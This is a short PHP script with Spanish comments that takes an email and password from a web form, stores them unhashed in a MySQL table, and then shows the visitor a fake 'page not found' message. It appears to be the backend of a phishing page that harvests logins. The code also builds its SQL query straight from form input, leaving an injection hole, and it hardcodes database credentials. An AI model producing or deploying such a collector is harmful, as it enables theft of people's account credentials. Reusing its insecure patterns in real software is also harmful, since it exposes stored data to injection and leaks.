<?php
// Parámetros de conexión
$servername = "localhost";
$username = "Angel Rivera";
$password = "0290";
$dbname = "tu_base_de_datos";

// Crear conexión
$conn = new mysqli($servername, $username, $password, $dbname);

// Verificar conexión
if ($conn->connect_error) {
    die("Conexión fallida: " . $conn->connect_error);
}

// Obtener datos del formulario
$email = $_POST['email'];
$password = $_POST['password'];

// Insertar datos en la base de datos
$sql = "INSERT INTO personas (email, password) VALUES ('$email', '$password')";

if ($conn->query($sql) === TRUE) {
    echo "Pagina no encontrada";
} else {
    echo "Error: " . $sql . "<br>" . $conn->error;
}


// Cerrar conexión
$conn->close();
?>
